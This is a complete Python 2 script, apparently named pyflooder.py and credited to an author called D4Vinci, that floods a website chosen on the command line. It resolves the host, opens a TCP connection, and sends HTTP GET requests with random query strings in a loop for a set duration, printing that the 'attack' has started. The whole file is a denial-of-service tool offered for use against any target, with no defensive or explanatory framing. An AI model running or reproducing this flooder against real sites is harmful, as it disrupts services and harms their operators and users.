# -*- coding: utf-8 -*-
#Author : D4Vinci
#All copyrights to Squnity team

import socket,sys,random,time,string,threading

try:
    host = str(sys.argv[1]).replace("https://","").replace("http://","").replace("www","")
    ip = socket.gethostbyname( host )
except:
    print " Error:\nMake sure you entered the correct website"
    sys.exit(0)

if len(sys.argv)<4:
    port = 80
    duration=100000000

elif len(sys.argv)==4:
    port = int(sys.argv[2])
    duration=int(sys.argv[3])

else:
    print "ERROR\n Usage : pyflooder.py hostname port how_many_attacks"

global n
n=0


dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
dos.connect((ip, port))

currTime = time.clock()
def attack():
    global n
    msg=str(string.letters+string.digits+string.punctuation)
    data="".join(random.sample(msg,15))

    try:
        dos.send( "GET /?%s HTTP/1.1\r\n" % data )
        dos.send("\r\n")
    except socket.error:
        print "\n [ No connection! Server maybe down ] "

print "[#] Attack started on",host,"|",ip,"\n"

while time.clock() < currTime + duration:
    attack()
